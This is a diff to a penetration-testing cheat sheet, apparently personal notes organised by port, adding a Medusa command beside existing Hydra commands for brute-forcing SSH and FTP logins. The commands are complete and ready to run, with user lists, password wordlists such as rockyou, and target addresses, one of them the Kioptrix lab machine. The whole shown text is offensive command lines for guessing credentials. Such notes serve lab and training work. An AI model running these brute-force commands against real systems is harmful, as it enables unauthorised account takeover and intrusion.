@@ -14,11 +14,18 @@ hydra -L users.txt -e nsr 192.168.56.102 ftp
 ## Port 22 - SSH
 
 ```text
+# Hydra
 hydra -l root -P wordlist.txt 192.168.0.101 ssh
 hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V
 
 # Example on kioptrix 3
 hydra -e nsr -l loneferret -P /root/Desktop/wordlists/10_million_password_list_top_100000.txt 192.168.1.70 ssh -t 4
+
+# Medusa 
+# -e ns for additional password checks ([n] No Password, [s] Password = Username)
+# -f Stop scanning host after first valid username/password found
+# -M to specify the module to execute ie SSH
+medusa -h 192.168.56.103 -U users.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh
 ```
 
 ## Port 80/443 htaccess
